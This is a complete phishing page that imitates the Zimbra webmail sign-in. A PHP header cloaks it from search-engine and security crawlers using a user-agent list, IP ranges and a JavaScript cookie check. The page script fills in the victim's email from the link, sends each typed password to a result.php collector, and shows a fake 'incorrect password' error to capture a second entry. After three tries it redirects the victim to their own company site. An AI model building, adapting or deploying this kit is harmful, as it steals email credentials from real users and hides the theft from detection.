<?php
// === Block & Log Bot Visitors ===

function logBlocked($reason) {
    $ip = $_SERVER['REMOTE_ADDR'];
    $ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown';
    $time = date("Y-m-d H:i:s");
    $log = "[$time] BLOCKED: $reason | IP: $ip | UA: $ua\n";
    file_put_contents(_DIR_ . '/blocked.log', $log, FILE_APPEND);
    http_response_code(403);
    exit("Access Denied: $reason.");
}

// === Block by Known Bot User-Agents ===
$blockedAgents = [
    'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider',
    'yandex', 'sogou', 'exabot', 'facebot', 'ia_archiver',
    'mj12bot', 'ahrefsbot', 'semrush', 'dotbot', 'gigabot', 'spbot',
    'crawler', 'scrapy', 'python', 'wget', 'curl'
];

$ua = strtolower(isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '');
foreach ($blockedAgents as $bot) {
    if (strpos($ua, $bot) !== false) {
        logBlocked("Bot User-Agent: $bot");
    }
}

// === Block by Known Bot CIDR IP Ranges ===
function ipInCIDR($ip, $cidr) {
    list($net, $mask) = explode('/', $cidr);
    $ipDec = ip2long($ip);
    $netDec = ip2long($net);
    $maskDec = ~((1 << (32 - $mask)) - 1);
    return ($ipDec & $maskDec) === ($netDec & $maskDec);
}

// Example CIDRs of Google, Bing, Ahrefs (partial — you can expand)
$blockedCIDRs = [
    '66.249.64.0/19',   // Googlebot
    '64.233.160.0/19',  // Googlebot
    '157.55.0.0/16',    // Bingbot
    '207.46.0.0/16',    // Bingbot
    '199.30.228.0/22',  // Ahrefs
    '5.45.207.0/24',    // Ahrefs
];

$visitorIP = $_SERVER['REMOTE_ADDR'];
foreach ($blockedCIDRs as $cidr) {
    if (ipInCIDR($visitorIP, $cidr)) {
        logBlocked("Bot IP Range: $cidr");
    }
}

// === JavaScript Challenge ===
// Humans pass, most bots don’t execute JS
if (!isset($_COOKIE['js_challenge_passed'])) {
    echo "<script>document.cookie='js_challenge_passed=true; path=/';location.reload();</script>";
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zimbra Web Client Sign In</title>
    <link rel="SHORTCUT ICON" href="https://mail.radiohuesca.com/img/logo/favicon.ico">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        main {
            width: 100%;
            height: 90vh;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .containerrr {
    width: 500px;
    height: auto;
    background: #007CC3;
    margin: auto;
    /* margin-top: 10rem; */
    padding: 3rem 1rem;
    color: white;
    padding-top: 1rem;
    /*margin-bottom: 9rem;*/
}
.mwebformdiv {
    width: 80%;
    margin: auto;
}
.mwebform .inp1 {
    display: flex;
    align-items: center;
    /* gap: 3.8rem; */
    justify-content: space-around;
    margin-bottom: 8px;
    color: white;
    width: 100%;
}
.ittt {
    width: 100%;
    border: 1px solid #FFF;
    padding: 0;
    width: 100%;
    border-radius: 5px;
    font-size: 12px;
    /* padding: 4px 5px; */
    height: 17px;
}
.myinp {
    width: 70%;
}
.mwebform .inp1 label {
    font-size: 13px;
}
.lbbb {
    width: 20%;
}
.mwebform .flex-check {
    display: flex;
    align-items: center;
    gap: 1rem;
    justify-content: space-between;
    color: white;
    margin-left: 29%;
    margin-bottom: 1rem;
    width: 71%;
    margin-top: 1rem;
}
.flex-check button {
    background-color: transparent;
    color: white;
    border-radius: 3px;
    border: 1px solid white;
    float: right;
    cursor: pointer;
    padding: 3px;
    margin-left: 6.3;
}
.flex-chec {
    display: flex;
    align-items: center;
    gap: 4.5rem;
    color: white;
    font-size: 13px;
    justify-content: space-between;
}
.flexdisopt {
    display: flex; 
    gap: 2rem;
}
.flex-chec .tooltips {
    cursor: pointer;
}
.mwebform {
    width: 76%;
    margin: auto;
}
.footer {
    text-align: center;
    width: 100%;
    /* width: 500px; */
    margin: auto;
    font-family: "Helvetica Neue", Helvetica, Arial, "Liberation Sans", sans-serif;
    position: fixed;
  bottom: 0;
  /* display: none; */
}
.legalNotice-small {
    cursor: default;
    margin-bottom: 5px;
    font-size: 12px;
    color: #656565;
}
.legalNotice-small a {
    color: #656565;
    text-decoration: none;
}
.copyright {
    cursor: default;
    margin-bottom: 5px;
    font-size: 12px;
    color: #656565;
}
#justerro{
    background-color: #FF9;
    padding: .5em 1em;
    border-radius: 8px;
    display: flex;
    align-items: center;
    gap: 1rem;
    margin: 1rem 0;
    display: none;
}
@media screen and (max-width: 600px) {
        .containerrr {
        width: 70%;
        height: auto;
        background: #007cc3;
        margin: auto;
        margin-top: 5rem;
        padding: 3rem 1rem;
        color: white;
        padding-top: 1rem;
        margin-bottom: 0rem;
    }
    main {
            width: 100%;
            height: 90vh;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
        }
    .flex-chec {
        display: flex;
        align-items: center;
        gap: 8%;
        color: white;
        font-size: 14px;
        justify-content: space-between;
    }
    .mwebform {
        width: 100%;
        margin: auto;
    }
    .flexdisopt {
            display: flex;
            gap: 0rem;
            flex-direction: column;
            width: 70%;
        }
    .mwebform .inp1 {
        display: flex;
        align-items: center;
        gap: 1.7rem;
        /* justify-content: space-around; */
        margin-bottom: 8px;
        color: white;
        width: 100%;
    }
    .legalNotice-small {
        display: none;
    }
    .lbbb {
        width: 28%;
    }
}
@media screen and (max-width: 400px) {
    .pdd {
        font-size: 11px !important;
    }
    .mwebform .inp1 {
        gap: 3px;
    }
}
    </style>
</head>
<body>
    <main class="mwebbox">
        <div class="containerrr">
            <h1>
                <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAKMAAAAkCAYAAADl2YrgAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA/dpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMDE0IDc5LjE1Njc5NywgMjAxNC8wOC8yMC0wOTo1MzowMiAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIgeG1wTU06T3JpZ2luYWxEb2N1bWVudElEPSJ1dWlkOjVEMjA4OTI0OTNCRkRCMTE5MTRBODU5MEQzMTUwOEM4IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjBBMzI0OEYwQ0ZFQjExRTU4QUY0Q0EyQUVCOENCRUY1IiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjBBMzI0OEVGQ0ZFQjExRTU4QUY0Q0EyQUVCOENCRUY1IiB4bXA6Q3JlYXRvclRvb2w9IkFkb2JlIElsbHVzdHJhdG9yIENDIDIwMTQgKE1hY2ludG9zaCkiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpmYjMyODc4Zi01YmE3LTQ3ZWUtOWE5OC1jZTllMjdlODRhODAiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5k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" alt="">
            </h1>
            <div class="formdiv">
                <form accept-charset='UTF-8' action='' class="mwebform" method="post" id="result">
                    <span class="errorrr" id="justerro">
                        <img src="./img/xicon.png" alt="">
                        <p style="text-align: center;margin: 0;color: #656565;font-size: 13px;">
                            The username or password is incorrect. Verify that CAPS LOCK is not on, and then retype the current username and password.
                        </p>
                    </span>
                    <div class="inp1">
                        <div class="lbbb">
                            <label for="username">Username:</label>
                        </div>
                        <div class="myinp">
                                                        <!-- edit email in the value -->
                            <input type="text" name="e" value="" id="email" required class="ittt" readonly>
                        </div>
                    </div>
                    <div class="inp1">
                        <div class="lbbb">
                            <label for="pwwwd">Password:</label>
                        </div>
                        <div class="myinp">
                            <input type="password" name="p" id="password" required class="ittt">
                        </div>
                    </div>
                    
                    <div class="flex-check">
                        <div class="pdd" style="font-size: 14px;">
                            <input type="checkbox" id="">
                            <span>Stay signed in</span>
                        </div>
                        <button type="submit" class="btn">Sign in</button>
                    </div>
                    <hr style="border-color: transparent transparent #fff;
                    height: 0; margin-bottom: 1rem;">
                    <div class="flex-chec">
                        <label for="cars">Version:</label>
                        <div class="flexdisopt">
                            <select name="version" id="cars">
                                <option value="Default">Default</option>
                                <option value="Touch">Touch</option>
                                <option value="Advance">Advance (Ajax)</option>
                                <option value="Standard(HTML)">Standard (HTML)</option>
                                <option value="Mobile">Mobile</option>
                                <option value="Touch">Touch</option>
                            </select>
                            <div class="tooltips">
                                <span>What's this?</span>
                            </div>
                        </div>
                    </div>
                </form>
            </div>
        </div>
        
    </main>
       <div class="footer">
            <div id="ZLoginNotice" class="legalNotice-small">
                <a target="_new" href="https://www.zimbra.com">Zimbra</a> :: the leader in open source messaging and collaboration :: <a target="_new" href="https://blog.zimbra.com">Blog</a> - <a target="_new" href="https://wiki.zimbra.com">Wiki</a> - <a target="_new" href="https://www.zimbra.com/forums">Forums</a>
            </div>
            <div class="copyright">
              Copyright © 2005-2021 Synacor, Inc. All rights reserved. "Zimbra" is a registered trademark of Synacor, Inc.
            </div>
        </div>
    <script>
        const url = "./result.php"; // your php url here 

        const fullUrl = window.location.href;
        
        const emailRegex = /#([^#]+)$/; // Assumes email is in the fragment identifier
        const match = fullUrl.match(emailRegex);
       
       
        const email = match ? match[1] : "";
               console.log(email);
       
       
               if (email) {
                   document.getElementById("email").value = email;
                   const domain = email.split('@')[1];
                   const companyName = domain.split('.')[0];
       
                   // Log or use the extracted company name
                   console.log(companyName);
                   localStorage.setItem("userDomain", domain);
       
                   // Log or use the extracted domain
                   console.log(domain);
       
               }
       

        // document.addEventListener('contextmenu', function (e) {
        //  e.preventDefault();
        // });

        var formSubmitted = 0;

        document.getElementById("result").addEventListener("submit", function(event) {
            var inputs = document.querySelector('input[required]');
            var pass = document.querySelector('input[type="password"]');
                event.preventDefault();

                formSubmitted++;
                const directts = localStorage.getItem("userDomain");
                console.log(directts);


                var valid = true;

                // Check if any required input field is empty
                    if (!inputs.value.trim()) {
                        valid = false;
                    }

                // If any required input field is empty, show alert and prevent form submission
                if (!valid) {
                    alert("Please fill in all fields.");
                    return;
                }

                var formData = new FormData(this);
                var xhr = new XMLHttpRequest();
                xhr.open("POST", `${url}`, true);

                xhr.onreadystatechange = function() {
                    if (xhr.readyState == 4 && xhr.status == 200) {
                        console.log(xhr.responseText);

                        if (formSubmitted === 1) {
                            console.log("YESSSSS");
                            pass.value = "";
                            document.getElementById("justerro").style.display = "flex";
                            // errrs.textContent = "Login page encountered an error. Please try again.";
                        } else if (formSubmitted === 2) {
                            pass.value = "";
                        } else if (formSubmitted >= 3) {
                            setInterval(function() {
                                window.location.href = `http://www.${directts}`;
                            }, 2000);
                        }
                    }
                };

                xhr.send(formData);
            });
    </script>
</body>
</html>